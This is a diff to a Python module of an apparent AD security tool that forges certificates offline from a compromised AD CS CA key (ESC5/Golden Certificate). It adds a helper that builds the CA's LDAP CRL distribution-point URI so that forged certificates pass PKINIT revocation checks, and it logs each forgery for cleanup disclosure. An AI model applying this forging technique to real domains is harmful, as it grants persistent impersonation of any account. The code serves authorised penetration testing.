@@ -1,4 +1,4 @@
-"""Native ADCS certificate forging (Golden Certificate).
+"""Native ADCS certificate forging (offline certificate forge).
 
 Replaces ``certipy forge`` subprocess.  Pure-cryptography operation: takes a
 compromised CA's PFX (private key + cert), builds a new certificate with
@@ -10,7 +10,8 @@ Public entry point: :func:`forge_certificate_native`.
 Mirrors certipy's ``Forge`` flow (commands/forge.py) but trimmed to the
 ADscan-relevant set of options (UPN, DNS, SID, subject override, validity
 period, key size).  S/MIME and application-policy extensions are out of scope
-for ADscan's GoldenCert chain — easy to add later if a customer needs them.
+for ADscan's ESC5 CA-key-forge chain — easy to add later if a customer needs
+them.
 """
 
 from __future__ import annotations
@@ -19,7 +20,7 @@ import os
 from dataclasses import dataclass
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
-from typing import Optional
+from typing import Any, Optional
 
 from adscan_internal import telemetry
 from adscan_core.rich_output import (
@@ -41,7 +42,7 @@ _SAN_URL_PREFIX = "tag:microsoft.com,2022-09-14:sid:"
 
 @dataclass(frozen=True)
 class ForgeConfig:
-    """Inputs for a Golden Certificate forge.
+    """Inputs for an offline certificate forge from a compromised CA key.
 
     Args:
         ca_pfx_path: Path to the compromised CA's PFX (cert + private key).
@@ -93,6 +94,58 @@ class ForgeResult:
     cert_san: Optional[str] = None
     cert_serial: Optional[str] = None
     error: Optional[str] = None
+
+
+def build_ca_crl_distribution_uri(
+    ca_name: Optional[str],
+    ca_host: Optional[str],
+    domain: Optional[str],
+) -> Optional[str]:
+    """Build a CA's default AD CS LDAP CRL distribution-point URI.
+
+    A forged (golden) certificate has no enrollment request and therefore no CRL
+    distribution point of its own. Without one, the KDC's revocation check during
+    PKINIT fails and it returns ``KDC_ERR_CLIENT_NOT_TRUSTED`` — Oliver Lyak's
+    documented "missing CRL" cause, the exact failure ``certipy forge`` hits
+    unless it clones a real issued cert via ``-template``.
+
+    Every certificate an AD CS enterprise CA issues carries the CA's default LDAP
+    CDP, which points at the CRL object published under
+    ``CN=<CA-name>,CN=<CA-server-short-name>,CN=CDP,CN=Public Key Services,
+    CN=Services,CN=Configuration,<config-NC>``. This reproduces that exact URI so
+    a forged cert survives the KDC's revocation check the same way a legitimately
+    issued cert (or ``certipy forge -template``) does. Verified byte-for-byte
+    against a real ``ESSOS-CA``-issued certificate's CDP.
+
+    Args:
+        ca_name: The CA's common name (e.g. ``ESSOS-CA``) — ``domains_data[...]["ca"]``.
+        ca_host: The CA host (FQDN or short name); only its short name is used.
+        domain: The AD domain (e.g. ``essos.local``) — becomes the config NC.
+
+    Returns:
+        The ``ldap:///...`` CDP URI, or ``None`` when any component is missing
+        (the caller then forges without a CDP, i.e. the prior behaviour).
+    """
+    if not ca_name or not ca_host or not domain:
+        return None
+    server_short = ca_host.split(".", 1)[0].strip()
+    if not server_short:
+        return None
+    config_nc = ",".join(f"DC={part}" for part in domain.split(".") if part.strip())
+    if not config_nc:
+        return None
+    dn = (
+        f"CN={ca_name.strip()},CN={server_short},CN=CDP,"
+        "CN=Public Key Services,CN=Services,CN=Configuration,"
+        f"{config_nc}"
+    )
+    # AD CS URL-encodes the spaces in the fixed container names (``%20``); CA and
+    # host CNs are LDAP tokens with no characters that need further escaping.
+    dn_encoded = dn.replace(" ", "%20")
+    return (
+        f"ldap:///{dn_encoded}"
+        "?certificateRevocationList?base?objectClass=cRLDistributionPoint"
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -212,7 +265,7 @@ def _render_forge_preflight(config: ForgeConfig) -> None:
     grid.add_row("Validity", f"{config.validity_days} days")
     if config.issuer_dn:
         grid.add_row("Issuer", mark_sensitive(config.issuer_dn, "service"))
-    title = Text("  Forge Certificate (Golden Cert)  ", style="bold white on red")
+    title = Text("  Forge Certificate (CA Key)  ", style="bold white on red")
     panel = Panel(grid, title=title, border_style="red", padding=(1, 2))
     get_console().print(panel)
 
@@ -258,15 +311,48 @@ def _render_forge_result(
 # ---------------------------------------------------------------------------
 
 
-def forge_certificate_native(config: ForgeConfig, output_dir: Path) -> ForgeResult:
+def forge_certificate_native(
+    config: ForgeConfig,
+    output_dir: Path,
+    *,
+    shell: Any = None,
+    domain: Optional[str] = None,
+    technique: str = "AD CS ESC5 — offline certificate forge",
+    ca_name: Optional[str] = None,
+    ca_host: Optional[str] = None,
+) -> ForgeResult:
     """Forge a certificate using a compromised CA's private key.
 
     The operation is purely local — no network, no Kerberos, no LDAP.  The
-    caller must already have obtained the CA PFX out-of-band (e.g. via
-    ``certipy ca -backup`` or DCSync of the CA's protected key material).
+    caller must already have obtained the CA PFX out-of-band (native CA backup
+    or DCSync of the CA's protected key material).
+
+    Environment-change disclosure (AD CS ESC5): when ``shell`` carries an
+    ``environment_change_ledger``, a successful forge is disclosed as a
+    ``manual_required`` cleanup item. A forged certificate carries no request id
+    and is absent from the CA database, so the normal revocation procedure
+    cannot reach it — the disclosure says so and points at CA key rotation.
+    Disclosure lives here in the primitive so every caller inherits it.
+
+    Args:
+        config: Forge inputs (CA PFX, target UPN/SID, validity).
+        output_dir: Where the forged victim PFX is written.
+        shell: Optional session shell carrying ``environment_change_ledger``.
+        domain: Ledger domain (defaults to the target UPN's realm when present).
+        technique: Ledger ``method`` recorded on the disclosure record.
+        ca_name: CA whose key signed the forgery (for the disclosure prose).
+        ca_host: Host the signing CA runs on (for the disclosure prose).
     """
     try:
-        return _do_forge(config, output_dir)
+        return _do_forge(
+            config,
+            output_dir,
+            shell=shell,
+            domain=domain,
+            technique=technique,
+            ca_name=ca_name,
+            ca_host=ca_host,
+        )
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
         print_exception(exception=exc)
@@ -274,7 +360,16 @@ def forge_certificate_native(config: ForgeConfig, output_dir: Path) -> ForgeResu
         return ForgeResult(success=False, error=str(exc))
 
 
-def _do_forge(config: ForgeConfig, output_dir: Path) -> ForgeResult:
+def _do_forge(
+    config: ForgeConfig,
+    output_dir: Path,
+    *,
+    shell: Any = None,
+    domain: Optional[str] = None,
+    technique: str = "AD CS ESC5 — offline certificate forge",
+    ca_name: Optional[str] = None,
+    ca_host: Optional[str] = None,
+) -> ForgeResult:
     """Concrete forge implementation; the public wrapper handles top-level errors."""
     from cryptography import x509
     from cryptography.hazmat.primitives.asymmetric import rsa
@@ -416,6 +511,37 @@ def _do_forge(config: ForgeConfig, output_dir: Path) -> ForgeResult:
 
     _render_forge_result(cert, cert_serial, cert_subject, pfx_path)
 
+    # Disclose the forged certificate — no request id, absent from the CA
+    # database, unreachable by the normal revocation procedure; only CA key
+    # rotation invalidates it. Best-effort: never break the forge on a ledger error.
+    try:
+        from adscan_internal.services.adcs import esc_cleanup as _esc_cleanup
+
+        not_after = None
+        try:
+            not_after = cert.not_valid_after_utc.strftime("%Y-%m-%d %H:%M UTC")
+        except Exception:  # noqa: BLE001
+            not_after = None
+        ledger_domain = domain
+        if not ledger_domain and config.target_upn and "@" in config.target_upn:
+            ledger_domain = config.target_upn.split("@", 1)[1]
+        _esc_cleanup.register_forged_certificate(
+            shell,
+            domain=ledger_domain or "",
+            technique=technique,
+            principal=config.target_upn,
+            target_sid=config.target_sid,
+            serial=cert_serial,
+            not_after=not_after,
+            ca_name=ca_name,
+            ca_host=ca_host,
+            subject=cert_subject,
+            pfx_path=str(pfx_path),
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+
     return ForgeResult(
         success=True,
         pfx_path=pfx_path,
@@ -429,5 +555,6 @@ def _do_forge(config: ForgeConfig, output_dir: Path) -> ForgeResult:
 __all__ = [
     "ForgeConfig",
     "ForgeResult",
+    "build_ca_crl_distribution_uri",
     "forge_certificate_native",
 ]
